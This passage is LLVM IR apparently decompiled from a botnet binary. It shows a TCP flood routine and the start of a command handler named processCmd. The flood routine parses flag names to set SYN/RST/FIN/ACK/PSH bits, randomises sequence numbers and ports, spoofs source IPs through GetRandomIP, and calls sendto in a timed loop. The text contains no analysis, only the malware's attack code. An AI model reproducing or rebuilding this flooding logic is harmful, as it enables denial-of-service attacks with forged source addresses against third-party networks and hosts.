  store i32 %v3_d088, i32* %r3.global-to-local, align 4
  %v1_d08c = trunc i32 %v3_d088 to i8
  %v2_d08c = load i32, i32* %r2.global-to-local, align 4
  %v3_d08c = add i32 %v2_d08c, 1
  %v4_d08c = inttoptr i32 %v3_d08c to i8*
  store i8 %v1_d08c, i8* %v4_d08c, align 1
  %v0_d090 = call i32 @rand_cmwc()
  %v2_d09c = add i32 %v3_d010, 24
  %v3_d09c = inttoptr i32 %v2_d09c to i32*
  store i32 %v0_d090, i32* %v3_d09c, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_d0a8 = add i32 %v3_d010, 28
  %v3_d0a8 = inttoptr i32 %v2_d0a8 to i32*
  store i32 0, i32* %v3_d0a8, align 4
  store i32 %v1_d030, i32* %r2.global-to-local, align 4
  %v1_d0b0 = add i32 %v3_d010, 32
  %v2_d0b0 = inttoptr i32 %v1_d0b0 to i8*
  %v3_d0b0 = load i8, i8* %v2_d0b0, align 4
  %v1_d0bc = urem i8 %v3_d0b0, 16
  %v1_d0c0 = or i8 %v1_d0bc, 80
  store i8 %v1_d0c0, i8* %v2_d0b0, align 4
  %v3_d0d0 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_d0d0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1977c.475 to i32), i32* @r1, align 4
  %v3_d0dc = inttoptr i32 %v3_d0d0 to i8*
  %v4_d0dc = call i32 @__GI_strcoll(i8* %v3_d0dc, i32 ptrtoint ([4 x i8]* @global_var_1977c.475 to i32))
  store i32 %v4_d0dc, i32* %r3.global-to-local, align 4
  %v2_d0e4 = icmp eq i32 %v4_d0dc, 0
  br i1 %v2_d0e4, label %dec_label_pc_d0ec, label %dec_label_pc_d140

dec_label_pc_d0ec:                                ; preds = %dec_label_pc_cfdc
  store i32 %v1_d030, i32* %r2.global-to-local, align 4
  %v1_d0f0 = add i32 %v3_d010, 33
  %v2_d0f0 = inttoptr i32 %v1_d0f0 to i8*
  %v3_d0f0 = load i8, i8* %v2_d0f0, align 1
  %v4_d0f0 = zext i8 %v3_d0f0 to i32
  %v1_d0f4 = or i32 %v4_d0f0, 2
  store i32 %v1_d0f4, i32* %r3.global-to-local, align 4
  %v1_d0f8 = trunc i32 %v1_d0f4 to i8
  store i8 %v1_d0f8, i8* %v2_d0f0, align 1
  store i32 %v1_d030, i32* %r2.global-to-local, align 4
  %v3_d100 = load i8, i8* %v2_d0f0, align 1
  %v4_d100 = zext i8 %v3_d100 to i32
  %v1_d104 = or i32 %v4_d100, 4
  store i32 %v1_d104, i32* %r3.global-to-local, align 4
  %v1_d108 = trunc i32 %v1_d104 to i8
  store i8 %v1_d108, i8* %v2_d0f0, align 1
  store i32 %v1_d030, i32* %r2.global-to-local, align 4
  %v3_d110 = load i8, i8* %v2_d0f0, align 1
  %v4_d110 = zext i8 %v3_d110 to i32
  %v1_d114 = or i32 %v4_d110, 1
  store i32 %v1_d114, i32* %r3.global-to-local, align 4
  %v1_d118 = trunc i32 %v1_d114 to i8
  store i8 %v1_d118, i8* %v2_d0f0, align 1
  store i32 %v1_d030, i32* %r2.global-to-local, align 4
  %v3_d120 = load i8, i8* %v2_d0f0, align 1
  %v4_d120 = zext i8 %v3_d120 to i32
  %v1_d124 = or i32 %v4_d120, 16
  store i32 %v1_d124, i32* %r3.global-to-local, align 4
  %v1_d128 = trunc i32 %v1_d124 to i8
  store i8 %v1_d128, i8* %v2_d0f0, align 1
  store i32 %v1_d030, i32* %r2.global-to-local, align 4
  %v3_d130 = load i8, i8* %v2_d0f0, align 1
  %v4_d130 = zext i8 %v3_d130 to i32
  %v1_d134 = or i32 %v4_d130, 8
  store i32 %v1_d134, i32* %r3.global-to-local, align 4
  %v1_d138 = trunc i32 %v1_d134 to i8
  store i8 %v1_d138, i8* %v2_d0f0, align 1
  br label %dec_label_pc_d284

dec_label_pc_d140:                                ; preds = %dec_label_pc_cfdc
  %v3_d140 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_d140, i32* %r3.global-to-local, align 4
  store i32 %v3_d140, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_19780.477 to i32), i32* @r1, align 4
  %v2_d14c = call i32 @__GI_strtok(i32 %v3_d140, i32 ptrtoint (i32* @global_var_19780.477 to i32))
  store i32 %v2_d14c, i32* %r3.global-to-local, align 4
  %v2_d27c20 = icmp eq i32 %v2_d14c, 0
  br i1 %v2_d27c20, label %dec_label_pc_d284, label %dec_label_pc_d15c.lr.ph

dec_label_pc_d15c.lr.ph:                          ; preds = %dec_label_pc_d140
  %v1_d17c = add i32 %v3_d010, 33
  %v2_d17c = inttoptr i32 %v1_d17c to i8*
  br label %dec_label_pc_d15c

dec_label_pc_d15c:                                ; preds = %dec_label_pc_d15c.lr.ph, %dec_label_pc_d264
  %storemerge1421 = phi i32 [ %v2_d14c, %dec_label_pc_d15c.lr.ph ], [ %v2_d26c, %dec_label_pc_d264 ]
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_19784.479 to i32), i32* @r1, align 4
  %v3_d168 = inttoptr i32 %storemerge1421 to i8*
  %v4_d168 = call i32 @__GI_strcoll(i8* %v3_d168, i32 ptrtoint ([4 x i8]* @global_var_19784.479 to i32))
  store i32 %v4_d168, i32* %r3.global-to-local, align 4
  %v2_d170 = icmp eq i32 %v4_d168, 0
  br i1 %v2_d170, label %dec_label_pc_d178, label %dec_label_pc_d18c

dec_label_pc_d178:                                ; preds = %dec_label_pc_d15c
  store i32 %v1_d030, i32* %r2.global-to-local, align 4
  %v3_d17c = load i8, i8* %v2_d17c, align 1
  %v4_d17c = zext i8 %v3_d17c to i32
  %v1_d180 = or i32 %v4_d17c, 2
  store i32 %v1_d180, i32* %r3.global-to-local, align 4
  %v1_d184 = trunc i32 %v1_d180 to i8
  store i8 %v1_d184, i8* %v2_d17c, align 1
  br label %dec_label_pc_d264

dec_label_pc_d18c:                                ; preds = %dec_label_pc_d15c
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_19788.481 to i32), i32* @r1, align 4
  %v4_d198 = call i32 @__GI_strcoll(i8* %v3_d168, i32 ptrtoint ([4 x i8]* @global_var_19788.481 to i32))
  store i32 %v4_d198, i32* %r3.global-to-local, align 4
  %v2_d1a0 = icmp eq i32 %v4_d198, 0
  br i1 %v2_d1a0, label %dec_label_pc_d1a8, label %dec_label_pc_d1bc

dec_label_pc_d1a8:                                ; preds = %dec_label_pc_d18c
  store i32 %v1_d030, i32* %r2.global-to-local, align 4
  %v3_d1ac = load i8, i8* %v2_d17c, align 1
  %v4_d1ac = zext i8 %v3_d1ac to i32
  %v1_d1b0 = or i32 %v4_d1ac, 4
  store i32 %v1_d1b0, i32* %r3.global-to-local, align 4
  %v1_d1b4 = trunc i32 %v1_d1b0 to i8
  store i8 %v1_d1b4, i8* %v2_d17c, align 1
  br label %dec_label_pc_d264

dec_label_pc_d1bc:                                ; preds = %dec_label_pc_d18c
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1978c.483 to i32), i32* @r1, align 4
  %v4_d1c8 = call i32 @__GI_strcoll(i8* %v3_d168, i32 ptrtoint ([4 x i8]* @global_var_1978c.483 to i32))
  store i32 %v4_d1c8, i32* %r3.global-to-local, align 4
  %v2_d1d0 = icmp eq i32 %v4_d1c8, 0
  br i1 %v2_d1d0, label %dec_label_pc_d1d8, label %dec_label_pc_d1ec

dec_label_pc_d1d8:                                ; preds = %dec_label_pc_d1bc
  store i32 %v1_d030, i32* %r2.global-to-local, align 4
  %v3_d1dc = load i8, i8* %v2_d17c, align 1
  %v4_d1dc = zext i8 %v3_d1dc to i32
  %v1_d1e0 = or i32 %v4_d1dc, 1
  store i32 %v1_d1e0, i32* %r3.global-to-local, align 4
  %v1_d1e4 = trunc i32 %v1_d1e0 to i8
  store i8 %v1_d1e4, i8* %v2_d17c, align 1
  br label %dec_label_pc_d264

dec_label_pc_d1ec:                                ; preds = %dec_label_pc_d1bc
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_19790.485 to i32), i32* @r1, align 4
  %v4_d1f8 = call i32 @__GI_strcoll(i8* %v3_d168, i32 ptrtoint ([4 x i8]* @global_var_19790.485 to i32))
  store i32 %v4_d1f8, i32* %r3.global-to-local, align 4
  %v2_d200 = icmp eq i32 %v4_d1f8, 0
  br i1 %v2_d200, label %dec_label_pc_d208, label %dec_label_pc_d21c

dec_label_pc_d208:                                ; preds = %dec_label_pc_d1ec
  store i32 %v1_d030, i32* %r2.global-to-local, align 4
  %v3_d20c = load i8, i8* %v2_d17c, align 1
  %v4_d20c = zext i8 %v3_d20c to i32
  %v1_d210 = or i32 %v4_d20c, 16
  store i32 %v1_d210, i32* %r3.global-to-local, align 4
  %v1_d214 = trunc i32 %v1_d210 to i8
  store i8 %v1_d214, i8* %v2_d17c, align 1
  br label %dec_label_pc_d264

dec_label_pc_d21c:                                ; preds = %dec_label_pc_d1ec
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_19794.487 to i32), i32* @r1, align 4
  %v4_d228 = call i32 @__GI_strcoll(i8* %v3_d168, i32 ptrtoint ([4 x i8]* @global_var_19794.487 to i32))
  store i32 %v4_d228, i32* %r3.global-to-local, align 4
  %v2_d230 = icmp eq i32 %v4_d228, 0
  br i1 %v2_d230, label %dec_label_pc_d238, label %dec_label_pc_d24c

dec_label_pc_d238:                                ; preds = %dec_label_pc_d21c
  store i32 %v1_d030, i32* %r2.global-to-local, align 4
  %v3_d23c = load i8, i8* %v2_d17c, align 1
  %v4_d23c = zext i8 %v3_d23c to i32
  %v1_d240 = or i32 %v4_d23c, 8
  store i32 %v1_d240, i32* %r3.global-to-local, align 4
  %v1_d244 = trunc i32 %v1_d240 to i8
  store i8 %v1_d244, i8* %v2_d17c, align 1
  br label %dec_label_pc_d264

dec_label_pc_d24c:                                ; preds = %dec_label_pc_d21c
  %v2_d250 = load i32, i32* @global_var_23b28.49, align 4
  store i32 %v2_d250, i32* %r3.global-to-local, align 4
  store i32 %storemerge1421, i32* @r2, align 4
  %v3_d260 = call i32 @Rootsprintf(i32 %v2_d250, i32 ptrtoint ([18 x i8]* @global_var_19798.489 to i32))
  br label %dec_label_pc_d264

dec_label_pc_d264:                                ; preds = %dec_label_pc_d238, %dec_label_pc_d208, %dec_label_pc_d1d8, %dec_label_pc_d1a8, %dec_label_pc_d178, %dec_label_pc_d24c
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_19780.477 to i32), i32* @r1, align 4
  %v2_d26c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_19780.477 to i32))
  store i32 %v2_d26c, i32* %r3.global-to-local, align 4
  %v2_d27c = icmp eq i32 %v2_d26c, 0
  br i1 %v2_d27c, label %dec_label_pc_d284, label %dec_label_pc_d15c

dec_label_pc_d284:                                ; preds = %dec_label_pc_d264, %dec_label_pc_d140, %dec_label_pc_d0ec
  %v0_d284 = call i32 @rand_cmwc()
  %v3_d290 = urem i32 %v0_d284, 65536
  store i32 %v3_d290, i32* %r3.global-to-local, align 4
  store i32 %v1_d030, i32* %r2.global-to-local, align 4
  %v1_d298 = trunc i32 %v0_d284 to i8
  %v3_d298 = add i32 %v3_d010, 34
  %v4_d298 = inttoptr i32 %v3_d298 to i8*
  store i8 %v1_d298, i8* %v4_d298, align 2
  %v0_d29c = load i32, i32* %r3.global-to-local, align 4
  %v3_d29c25 = udiv i32 %v0_d29c, 256
  %v1_d2a0 = trunc i32 %v3_d29c25 to i8
  %v2_d2a0 = load i32, i32* %r2.global-to-local, align 4
  %v3_d2a0 = add i32 %v2_d2a0, 15
  %v4_d2a0 = inttoptr i32 %v3_d2a0 to i8*
  store i8 %v1_d2a0, i8* %v4_d2a0, align 1
  store i32 %v1_d030, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_d2ac = add i32 %v3_d010, 36
  %v4_d2ac = inttoptr i32 %v3_d2ac to i8*
  store i8 0, i8* %v4_d2ac, align 4
  %v0_d2b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_d2b0 = trunc i32 %v0_d2b0 to i8
  %v2_d2b0 = load i32, i32* %r2.global-to-local, align 4
  %v3_d2b0 = add i32 %v2_d2b0, 17
  %v4_d2b0 = inttoptr i32 %v3_d2b0 to i8*
  store i8 %v1_d2b0, i8* %v4_d2b0, align 1
  store i32 %v1_d030, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_d2bc = add i32 %v3_d010, 38
  %v4_d2bc = inttoptr i32 %v3_d2bc to i8*
  store i8 0, i8* %v4_d2bc, align 2
  %v0_d2c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_d2c0 = trunc i32 %v0_d2c0 to i8
  %v2_d2c0 = load i32, i32* %r2.global-to-local, align 4
  %v3_d2c0 = add i32 %v2_d2c0, 19
  %v4_d2c0 = inttoptr i32 %v3_d2c0 to i8*
  store i8 %v1_d2c0, i8* %v4_d2c0, align 1
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v2_ce9c, label %dec_label_pc_d2d0, label %dec_label_pc_d2e8

dec_label_pc_d2d0:                                ; preds = %dec_label_pc_d284
  %v0_d2d0 = call i32 @rand_cmwc()
  %v3_d2d8 = mul i32 %v0_d2d0, 65536
  store i32 %v3_d2d8, i32* %r3.global-to-local, align 4
  %extract.t = trunc i32 %v0_d2d0 to i8
  br label %dec_label_pc_d304

dec_label_pc_d2e8:                                ; preds = %dec_label_pc_d284
  %v3_d2f0 = urem i32 %arg2, 65536
  store i32 %v3_d2f0, i32* %r3.global-to-local, align 4
  %v1_d2f8 = call i32 @htons(i32 %v3_d2f0)
  %extract.t71 = trunc i32 %v1_d2f8 to i8
  br label %dec_label_pc_d304

dec_label_pc_d304:                                ; preds = %dec_label_pc_d2d0, %dec_label_pc_d2e8
  %v0_d2d0.sink.off0 = phi i8 [ %extract.t, %dec_label_pc_d2d0 ], [ %extract.t71, %dec_label_pc_d2e8 ]
  store i32 %v1_d030, i32* %r2.global-to-local, align 4
  %v4_d308 = sext i8 %v0_d2d0.sink.off0 to i32
  %v3_d30c = add i32 %v3_d010, 22
  %v4_d30c = inttoptr i32 %v3_d30c to i8*
  store i8 %v0_d2d0.sink.off0, i8* %v4_d30c, align 2
  %v3_d314 = sdiv i32 %v4_d308, 256
  %v4_d314 = trunc i32 %v3_d314 to i8
  store i32 %v3_d314, i32* %r3.global-to-local, align 4
  %v4_d318 = add i32 %v3_d010, 23
  %v5_d318 = inttoptr i32 %v4_d318 to i8*
  store i8 %v4_d314, i8* %v5_d318, align 1
  %v5_d324 = call i32 @tcpcsum(i32 %v3_d010, i32 %v1_d030, i32 %v1_d030, i32 %v3_d314)
  %sext = mul i32 %v5_d324, 16777216
  %v1_d328 = sdiv i32 %sext, 16777216
  store i32 %v1_d328, i32* %r3.global-to-local, align 4
  store i32 %v1_d030, i32* %r2.global-to-local, align 4
  %v1_d330 = trunc i32 %v1_d328 to i8
  store i8 %v1_d330, i8* %v4_d2ac, align 4
  %v0_d334 = load i32, i32* %r3.global-to-local, align 4
  %v3_d33428 = udiv i32 %v0_d334, 256
  %v1_d338 = trunc i32 %v3_d33428 to i8
  %v2_d338 = load i32, i32* %r2.global-to-local, align 4
  %v3_d338 = add i32 %v2_d338, 17
  %v4_d338 = inttoptr i32 %v3_d338 to i8*
  store i8 %v1_d338, i8* %v4_d338, align 1
  %v1_d348 = or i32 %v3_d010, 2
  store i32 %v1_d348, i32* %r3.global-to-local, align 4
  %v1_d34c = inttoptr i32 %v1_d348 to i8*
  %v2_d34c = load i8, i8* %v1_d34c, align 2
  %v3_d34c = zext i8 %v2_d34c to i32
  store i32 %v3_d34c, i32* %r2.global-to-local, align 4
  %v1_d350 = or i32 %v1_d00c, 3
  %v2_d350 = inttoptr i32 %v1_d350 to i8*
  %v3_d350 = load i8, i8* %v2_d350, align 1
  %v4_d350 = zext i8 %v3_d350 to i32
  %v4_d354 = mul nuw nsw i32 %v4_d350, 256
  %v5_d354 = or i32 %v4_d354, %v3_d34c
  store i32 %v5_d354, i32* %r3.global-to-local, align 4
  %v3_d360 = call i32 @csum(i8* %v4_d06c, i32 %v5_d354)
  %sext4 = mul i32 %v3_d360, 16777216
  %v1_d364 = sdiv i32 %sext4, 16777216
  store i32 %v1_d364, i32* %r3.global-to-local, align 4
  store i32 %v3_d010, i32* %r2.global-to-local, align 4
  %v1_d36c = trunc i32 %v1_d364 to i8
  %v3_d36c = add i32 %v3_d010, 10
  %v4_d36c = inttoptr i32 %v3_d36c to i8*
  store i8 %v1_d36c, i8* %v4_d36c, align 2
  %v0_d370 = load i32, i32* %r3.global-to-local, align 4
  %v3_d370 = sdiv i32 %v0_d370, 256
  store i32 %v3_d370, i32* %r3.global-to-local, align 4
  %v1_d374 = trunc i32 %v3_d370 to i8
  %v2_d374 = load i32, i32* %r2.global-to-local, align 4
  %v3_d374 = add i32 %v2_d374, 11
  %v4_d374 = inttoptr i32 %v3_d374 to i8*
  store i8 %v1_d374, i8* %v4_d374, align 1
  %v2_d37c = call i32 @__GI_time(i32* null)
  %v2_d388 = add i32 %v2_d37c, %arg3
  store i32 %v2_d388, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_d3e0 = add i32 %v3_d010, 12
  %v3_d3e0 = inttoptr i32 %v2_d3e0 to i32*
  %v3_d3f8 = add i32 %v3_d010, 4
  %v4_d3f8 = inttoptr i32 %v3_d3f8 to i8*
  %v4_d440 = add i32 %v3_d010, 37
  %v5_d440 = inttoptr i32 %v4_d440 to i8*
  br label %dec_label_pc_d39c

dec_label_pc_d39c:                                ; preds = %dec_label_pc_d4d4, %dec_label_pc_d4c8, %dec_label_pc_d304
  %stack_var_-88.0 = phi i32 [ 0, %dec_label_pc_d304 ], [ 0, %dec_label_pc_d4c8 ], [ %v1_d4d8, %dec_label_pc_d4d4 ]
  store i32 %v3_d010, i32* %r2.global-to-local, align 4
  %v1_d3a4 = load i32, i32* @sp, align 4
  %v2_d3a4 = inttoptr i32 %v1_d3a4 to i32*
  store i32 %v2_cf0c, i32* %v2_d3a4, align 4
  %v1_d3ac = load i32, i32* @sp, align 4
  %v2_d3ac = add i32 %v1_d3ac, 4
  %v3_d3ac = inttoptr i32 %v2_d3ac to i32*
  store i32 16, i32* %v3_d3ac, align 4
  %v0_d3b4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_cfe0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v6_d3c0 = inttoptr i32 %v0_d3b4 to i32*
  %v7_d3c0 = call i32 @__libc_sendto(i32 %v0_cf30, i32* %v6_d3c0, i32 %v1_cfe0, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_d3c8 = call i32 @GetRandomIP(i32 %storemerge10)
  store i32 %v1_d3c8, i32* %r3.global-to-local, align 4
  %v1_d3d4 = call i32 @htonl(i32 %v1_d3c8)
  store i32 %v1_d3d4, i32* %r2.global-to-local, align 4
  store i32 %v3_d010, i32* %r3.global-to-local, align 4
  store i32 %v1_d3d4, i32* %v3_d3e0, align 4
  %v0_d3e4 = call i32 @rand_cmwc()
  %v3_d3f0 = urem i32 %v0_d3e4, 65536
  store i32 %v3_d3f0, i32* %r3.global-to-local, align 4
  store i32 %v3_d010, i32* %r2.global-to-local, align 4
  %v1_d3f8 = trunc i32 %v0_d3e4 to i8
  store i8 %v1_d3f8, i8* %v4_d3f8, align 4
  %v0_d3fc = load i32, i32* %r3.global-to-local, align 4
  %v3_d3fc = sdiv i32 %v0_d3fc, 256
  store i32 %v3_d3fc, i32* %r3.global-to-local, align 4
  %v1_d400 = trunc i32 %v3_d3fc to i8
  %v2_d400 = load i32, i32* %r2.global-to-local, align 4
  %v3_d400 = add i32 %v2_d400, 5
  %v4_d400 = inttoptr i32 %v3_d400 to i8*
  store i8 %v1_d400, i8* %v4_d400, align 1
  %v0_d404 = call i32 @rand_cmwc()
  store i32 %v0_d404, i32* %r2.global-to-local, align 4
  store i32 %v1_d030, i32* %r3.global-to-local, align 4
  store i32 %v0_d404, i32* %v3_d09c, align 4
  %v0_d414 = call i32 @rand_cmwc()
  %v3_d420 = urem i32 %v0_d414, 65536
  store i32 %v3_d420, i32* %r3.global-to-local, align 4
  store i32 %v1_d030, i32* %r2.global-to-local, align 4
  %v1_d428 = trunc i32 %v0_d414 to i8
  store i8 %v1_d428, i8* %v5_d034, align 4
  %v0_d42c = load i32, i32* %r3.global-to-local, align 4
  %v3_d42c29 = udiv i32 %v0_d42c, 256
  %v1_d430 = trunc i32 %v3_d42c29 to i8
  %v2_d430 = load i32, i32* %r2.global-to-local, align 4
  %v3_d430 = add i32 %v2_d430, 1
  %v4_d430 = inttoptr i32 %v3_d430 to i8*
  store i8 %v1_d430, i8* %v4_d430, align 1
  store i32 %v1_d030, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i8 0, i8* %v4_d2ac, align 4
  store i8 0, i8* %v5_d440, align 1
  %v5_d44c = call i32 @tcpcsum(i32 %v3_d010, i32 %v1_d030, i32 %v1_d030, i32 0)
  %sext5 = mul i32 %v5_d44c, 16777216
  %v1_d450 = sdiv i32 %sext5, 16777216
  store i32 %v1_d450, i32* %r3.global-to-local, align 4
  store i32 %v1_d030, i32* %r2.global-to-local, align 4
  %v1_d458 = trunc i32 %v1_d450 to i8
  store i8 %v1_d458, i8* %v4_d2ac, align 4
  %v0_d45c = load i32, i32* %r3.global-to-local, align 4
  %v3_d45c30 = udiv i32 %v0_d45c, 256
  %v1_d460 = trunc i32 %v3_d45c30 to i8
  %v2_d460 = load i32, i32* %r2.global-to-local, align 4
  %v3_d460 = add i32 %v2_d460, 17
  %v4_d460 = inttoptr i32 %v3_d460 to i8*
  store i8 %v1_d460, i8* %v4_d460, align 1
  store i32 %v1_d348, i32* %r3.global-to-local, align 4
  %v2_d474 = load i8, i8* %v1_d34c, align 2
  %v3_d474 = zext i8 %v2_d474 to i32
  store i32 %v3_d474, i32* %r2.global-to-local, align 4
  %v3_d478 = load i8, i8* %v2_d350, align 1
  %v4_d478 = zext i8 %v3_d478 to i32
  %v4_d47c = mul nuw nsw i32 %v4_d478, 256
  %v5_d47c = or i32 %v4_d47c, %v3_d474
  store i32 %v5_d47c, i32* %r3.global-to-local, align 4
  %v3_d488 = call i32 @csum(i8* %v4_d06c, i32 %v5_d47c)
  %sext6 = mul i32 %v3_d488, 16777216
  %v1_d48c = sdiv i32 %sext6, 16777216
  store i32 %v1_d48c, i32* %r3.global-to-local, align 4
  store i32 %v3_d010, i32* %r2.global-to-local, align 4
  %v1_d494 = trunc i32 %v1_d48c to i8
  store i8 %v1_d494, i8* %v4_d36c, align 2
  %v0_d498 = load i32, i32* %r3.global-to-local, align 4
  %v3_d49831 = udiv i32 %v0_d498, 256
  %v1_d49c = trunc i32 %v3_d49831 to i8
  %v2_d49c = load i32, i32* %r2.global-to-local, align 4
  %v3_d49c = add i32 %v2_d49c, 11
  %v4_d49c = inttoptr i32 %v3_d49c to i8*
  store i8 %v1_d49c, i8* %v4_d49c, align 1
  store i32 %stack_var_-88.0, i32* %r3.global-to-local, align 4
  %v9_d4a8 = icmp eq i32 %stack_var_-88.0, %arg7
  br i1 %v9_d4a8, label %dec_label_pc_d4b0, label %dec_label_pc_d4d4

dec_label_pc_d4b0:                                ; preds = %dec_label_pc_d39c
  %v2_d4b4 = call i32 @__GI_time(i32* null)
  store i32 %v2_d4b4, i32* %r2.global-to-local, align 4
  store i32 %v2_d388, i32* %r3.global-to-local, align 4
  %v8_d4c4 = icmp sgt i32 %v2_d4b4, %v2_d388
  br i1 %v8_d4c4, label %dec_label_pc_d4e4, label %dec_label_pc_d4c8

dec_label_pc_d4c8:                                ; preds = %dec_label_pc_d4b0
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_d39c

dec_label_pc_d4d4:                                ; preds = %dec_label_pc_d39c
  %v1_d4d8 = add i32 %stack_var_-88.0, 1
  store i32 %v1_d4d8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d39c

dec_label_pc_d4e4:                                ; preds = %dec_label_pc_d4b0, %dec_label_pc_cee8, %dec_label_pc_cf94, %dec_label_pc_cf48
  %v12_d4ec = phi i32 [ %v3_cef8, %dec_label_pc_cee8 ], [ %v3_cfa4, %dec_label_pc_cf94 ], [ %v3_cf58, %dec_label_pc_cf48 ], [ %v2_d4b4, %dec_label_pc_d4b0 ]
  store i32 %v3_ce5c, i32* @r4, align 4
  store i32 %v6_ce5c, i32* @fp, align 4
  ret i32 %v12_d4ec

; uselistorder directives
  uselistorder i32 %v1_d4d8, { 1, 0 }
  uselistorder i32 %v1_d48c, { 1, 0 }
  uselistorder i32 %v1_d450, { 1, 0 }
  uselistorder i32 %v0_d414, { 1, 0 }
  uselistorder i32 %v3_d3fc, { 1, 0 }
  uselistorder i32 %v0_d3e4, { 1, 0 }
  uselistorder i32 %stack_var_-88.0, { 0, 2, 1 }
  uselistorder i32 %v2_d388, { 1, 0, 2 }
  uselistorder i32 %v3_d370, { 1, 0 }
  uselistorder i32 %v1_d364, { 1, 0 }
  uselistorder i32 %v1_d348, { 0, 2, 1 }
  uselistorder i32 %v1_d328, { 1, 0 }
  uselistorder i32 %v3_d314, { 2, 0, 1 }
  uselistorder i8 %v0_d2d0.sink.off0, { 1, 0 }
  uselistorder i32 %v3_d2f0, { 1, 0 }
  uselistorder i32 %v0_d2d0, { 1, 0 }
  uselistorder i32 %v0_d284, { 1, 0 }
  uselistorder i32 %v2_d26c, { 1, 0, 2 }
  uselistorder i32 %storemerge1421, { 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i8* %v2_d17c, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9 }
  uselistorder i8* %v2_d0f0, { 1, 5, 2, 6, 3, 7, 4, 8, 0, 9 }
  uselistorder i32 %v3_d088, { 1, 0 }
  uselistorder i32 %v0_d070, { 1, 0 }
  uselistorder i32 %v1_d030, { 5, 7, 6, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 22, 21, 20, 19, 18, 0, 1, 2, 3, 4, 23, 24, 25, 26 }
  uselistorder i32 %v3_d010, { 12, 11, 10, 8, 6, 23, 9, 7, 4, 5, 22, 3, 21, 20, 19, 18, 17, 16, 24, 15, 14, 13, 2, 1, 0 }
  uselistorder i32 %v1_cfe0, { 1, 0 }
  uselistorder i32 %v3_cecc, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 0, 2 }
  uselistorder i32* %stack_var_-68, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 6, 7, 4, 5, 11, 12, 8, 9, 10, 13, 14, 15, 16, 17, 18, 19, 20, 21, 24, 25, 22, 23, 27, 28, 26, 29, 30, 31, 32, 33, 34, 35, 36, 37, 54, 38, 39, 41, 40, 42, 44, 43, 45, 47, 46, 48, 50, 49, 51, 53, 52, 83, 55, 56, 57, 58, 59, 60, 63, 61, 62, 64, 65, 66, 67, 69, 68, 70, 71, 72, 74, 73, 75, 76, 77, 79, 78, 80, 81, 82, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @tcpcsum, { 1, 0 }
  uselistorder i32 (i32)* @htonl, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @GetRandomIP, { 3, 2, 1, 0 }
  uselistorder i32 ()* @rand_cmwc, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg4, { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_d4e4, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_d304, { 1, 0 }
  uselistorder label %dec_label_pc_d264, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_d15c, { 1, 0 }
  uselistorder label %dec_label_pc_cfdc, { 1, 0 }
  uselistorder label %dec_label_pc_cee8, { 1, 0 }
}

define i32 @processCmd(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_d520 = load i32, i32* @r4, align 4
  %v6_d520 = load i32, i32* @r5, align 4
  %v9_d520 = load i32, i32* @r6, align 4
  %v12_d520 = load i32, i32* @r7, align 4
  %v15_d520 = load i32, i32* @r8, align 4
  %v18_d520 = load i32, i32* @fp, align 4
  store i32 54568, i32* %stack_var_-4, align 4
  %v2_d524 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_d524, i32* @fp, align 4
  %v2_d538 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_19438.51 to i32), i32* @r1, align 4
  %v3_d544 = inttoptr i32 %v2_d538 to i8*
